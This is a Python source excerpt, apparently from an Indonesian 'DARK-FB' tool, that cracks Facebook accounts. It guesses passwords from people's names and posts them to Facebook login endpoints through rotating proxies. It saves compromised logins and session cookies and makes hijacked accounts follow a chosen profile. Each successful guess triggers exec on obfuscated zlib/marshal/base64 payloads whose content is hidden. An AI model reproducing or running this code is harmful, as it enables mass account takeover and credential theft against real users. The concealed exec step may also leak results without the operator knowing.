	def pilih_katasandi(self):
		global pass_
		tampilan_pass = f"""   {QQ}[{CC}01{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+12345
   {QQ}[{CC}02{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+1234 {QQ}•{PP} Name+12345
   {QQ}[{CC}03{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+1234 {QQ}•{PP} Name+12345 {QQ}•{PP} Nama Lengkap

   {QQ}[{CC}04{QQ}] {QQ}Manual"""
		prints(Panel(tampilan_pass,title=f"{GOD}{PP}Pilih Bentuk Password{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{c}PILIH : {a}")
		if hu in ['1','01']:
			pass_ = "1"
			self.pass_tambahan()
		elif hu in ['2','02']:
			pass_ = "2"
			self.pass_tambahan()
		elif hu in ['3','03']:
			pass_ = "3"
			self.pass_tambahan()
		elif hu in ['4','04']:
			pass_ = "manual"
		else:
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
			self.pilih_katasandi()
	def pass_tambahan(self):
		global pass_t,pw_apa
		prints(Panel(f"{WIR}{KK}Apakah Anda Mau Menggunkan Password Tambahan? {QQ}[{PP}Y/n{QQ}]",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		pas_t = input(f"{a}   ┗{c}Pilih : {a}")
		if pas_t=="y" or pas_t=="Y":
			prints(Panel(f"{WAR}{KK}Masukan Password Yang Lebih Dari 5(Lima) Huruf\n{WAR}{KK}Gunakan Symbol | Untuk Pemisah\n{WOR}{QQ}Contoh : {PP}anjing{QQ}|{PP}kontol",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PIL"))
			pw_apa = input(f"{a}   ┗{c}Password : {a}").split("|")
			if len(pw_apa)>0:
				pass_t = "ya"
			else:
				pass_t = "no"
	def buat_sandi(self,nick):
		depan = nick.split(' ')[0]
		pow = []
		if pass_ == "manual":
			for pw_tambahan in pw_apa:
				if len(pw_tambahan)>5:
					pow.append(pw_tambahan)
		else:
			if len(depan)<3:pass
			elif len(depan)==3 or len(depan)==4 or len(depan)==5:
				if pass_ == "1":
					pow.append(depan+'123')
					pow.append(depan+'12345')
				elif pass_ == "2":
					pow.append(depan+'123')
					pow.append(depan+'12345')
					pow.append(depan+'1234')
				elif pass_ == "3":
					pow.append(depan+'123')
					pow.append(depan+'12345')
					pow.append(depan+'1234')
			else:
				if pass_ == "1":
					pow.append(depan)
					pow.append(depan+'123')
					pow.append(depan+'12345')
					pow.append(depan+'1234')
				elif pass_ == "2":
					pow.append(depan)
					pow.append(depan+'123')
					pow.append(depan+'12345')
					pow.append(depan+'1234')
				elif pass_ == "3":
					pow.append(depan)
					pow.append(depan+'123')
					pow.append(depan+'12345')
					pow.append(depan+'1234')
					pow.append(nick)
			if pass_t == "ya":
				for pw_tambahan in pw_apa:
					if len(pw_tambahan)>5:
						pow.append(pw_tambahan)
		return pow
	def pasang_bot_follow(self):
		prints(Panel(f"{WIR}{KK}Apakah Anda Mau Menggunkan Bot Follow Facebook Jika Dapat Akun Ok? {QQ}[{PP}Y/n{QQ}]",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		pas_t = input(f"{a}   ┗{c}Pilih : {a}")
		if pas_t=="y" or pas_t=="Y":
			prints(Panel(f"{WAR}{KK}Masukan ID Akun Untuk DiFollow",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN ISI"))
			id = input(f"{a}   ┗{c}ID Anda : {a}")
			if id == "":self.pasang_bot_follow()
			else:follow_id.append(id)

	def mentod(self):
		global method
		tampilan_mentod = f"""   {QQ}[{CC}01{QQ}] {PP}Method 1
   {QQ}[{CC}02{QQ}] {PP}Method 2
   {QQ}[{CC}03{QQ}] {PP}Method 3
   {QQ}[{CC}04{QQ}] {PP}Method 4
   {QQ}[{CC}05{QQ}] {PP}All Method"""
		prints(Panel(tampilan_mentod,title=f"{GOD}{PP}Pilih Bentuk Password{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{c}PILIH : {a}")
		if hu in ['1','01']:
			method = "1"
		elif hu in ['2','02']:
			method = "2"
		elif hu in ['3','03']:
			method = "3"
		elif hu in ['4','04']:
			method = "4"
		elif hu in ['5','05']:
			method = "semua"
		else:
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
			self.mentod()

	def follow_my_fb(self,cokz):
		try:
			for umn in follow_id:
				try:
					r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id="+umn,cookies={"cookie":cokz}).text,"html.parser")
					get = r.find("a",string="Ikuti").get("href")
					sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokz}).text
				except:pass
		except:pass
	def kata_buat_pro(self):
		cls();logo()
		xanzi = []
		tampilan_save = f"""{WOR}{QQ}Results {II}Ok{QQ} Save To : {II}results/OK-{all_day}.txt
{WOR}{QQ}Results {KK}Cp{QQ} Save To : {KK}results/CP-{all_day}.txt
{WAR}{QQ}Jika Sudah 500 ID Jangan Lupa Hidup Matikan Mode Pesawat"""
		xanzi.append(Panel(tampilan_save,width=98,title=f"{GOD}{PP}Crack Information{GOD}",style=f"{A}"))
		console.print(Columns(xanzi))
	def save_z(self,jns,uq,pew,kuk):
		if jns == "cp":
			open(f"results/CP-{all_day}.txt","a").write(uq+"|"+pew+"\n")
		else:
			open(f"results/OK-{all_day}.txt","a").write(uq+"|"+pew+"|"+kuk+"\n")
	def mulai_crack(self):
		global anim,anim2
		anim = Progress(SpinnerColumn("arrow2"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		anim2 = anim.add_task('',total=len(sos))
		with anim:
			with __Ferly__(max_workers=xtc["setting_crack"]["max-crack"]) as kontok:
				for kocok in sos:
					try:
						userz = kocok.split('<=>')[0]
						na_ma = kocok.split('<=>')[1]
						kontok.submit(self.start_crack, userz, self.buat_sandi(na_ma))
					except:pass
	def start_crack(self,user,pasen):
		global ok,cp,loop
		loop += 1
		anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(id)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
		anim.advance(anim2)
		mia = open('.data/proxy.txt','r').read().splitlines()
		ua = random.choice(ugen)
		proxZ = {'http': f'socks5://{random.choice(mia)}'}
		url = xtc["setting_crack"]["domain"]
		try:
			for pw in pasen:
				session = requests.Session()
				session.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
				link = session.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
				date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
				head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
				bx = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100"+yyy,data=date, headers=head,proxies=proxZ)
				if "checkpoint" in session.cookies.get_dict().keys():
					user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "");wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]))
					if wrt in cp:pass
					else:
						cp.append(user+"|"+pw)
						tampilan_cp = f"""   {QQ}[{MM}XX{QQ}]{BB} Method-Crack   : {PP}4{QQ}
   {QQ}[{MM}XX{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}
    ||
   {QQ}[{MM}XX{QQ}]{BB} Username/Email : {MM}{user}{QQ}
   {QQ}[{MM}XX{QQ}]{BB} Password/Sandi : {MM}{pw}{QQ}"""
						prints(Panel(tampilan_cp,title=f"{GOD}{KK}AKUN CP{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{MM}Hemmm.. Sepertinya Anda Tidak Hoki{QQ}"))
						self.save_z("cp",user,pw,"")
					break
				elif "c_user" in session.cookies.get_dict().keys():
					userz = re.findall('c_user=(.*);', self.susun_cookies(session))[0]
					user = userz.split(';')[0]
					wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]))
					if wrt in ok:pass
					else:
						ok.append(user+"|"+pw)
						tampilan_ok = f"""   {QQ}[{II}✓✓{QQ}]{BB} Method-Crack   : {PP}4{QQ}
   {QQ}[{II}✓✓{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}
    ||
   {QQ}[{II}✓✓{QQ}]{BB} Username/Email : {II}{user}{QQ}
   {QQ}[{II}✓✓{QQ}]{BB} Password/Sandi : {II}{pw}{QQ}
   {QQ}[{II}✓✓{QQ}]{BB} Cookies        : {QQ}{self.susun_cookies(session)}
   {QQ}[{II}✓✓{QQ}]{BB} Ingformasi     : {PP}Kamu Ganteng{QQ}"""
						prints(Panel(tampilan_ok,title=f"{GOD}{II}AKUN OK{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{II}Anjay Hoki{QQ}"))
						self.follow_my_fb(self.susun_cookies(session))
						self.save_z("ok",user,pw,self.susun_cookies(session))
					break
				else:continue
		except Exception as e:
			print(e)
			loop-=1
			self.start_crack(user,pasen)
		except requests.exceptions.ConnectionError:
			time.sleep(5)
			loop-=1
			self.start_crack(user,pasen)
	def susun_cookies(self,jembut):
		kukisz = "noscript=1;"
		kukisz += (";").join([ "%s=%s" % (key, value) for key, value in jembut.cookies.get_dict().items() ])
		return kukisz





class cek_file:
	def __init__(self):
		self.__check_update_("3.2")
		self.__check_status_("Aktif")
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/Denventa/DARK-FB/main/.data/version.txt").text.strip()
		except requests.exceptions.ConnectionError:
			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
			quit()
		if version == version_:pass
		else:
			os.system('git pull;clear');time.sleep(1)
			cls();logo()
			text = Text(f"""Halo Sobat.. Sepertinya Script Yang Anda Gunakan Version {m}{version_}{q}\nJadi... Script Yang Baru Version {i}{version}{q}\nJika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini\n{i}python update.py{q}""")
			console.rule("Informasi",style="yellow")
			console.print(text, style="cyan")
			print(m+"#"+k+" Coba Ketik :"+q+" python run.py Sekali Lagi!!")
			quit()
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/Denventa/DARK-FB/main/.data/status.txt").text.strip()
		except requests.exceptions.ConnectionError:
			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
			quit()
		if mainx == mainz:
			global yyy
			yyy = ""
		else:
			print(m+"#"+q+" MAAF SEVER DARK-FB SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D")
			os.system('git pull')
			quit()
if "hai" == "hai":
	cek_file()
	globalz()
	try:cek = json.loads(open(".data/sensi.json","r").read())
	except:os.sys.exit("* Makanya Jangan Rikod Sc Orang")
	folder()
	menu().daftar_menu()
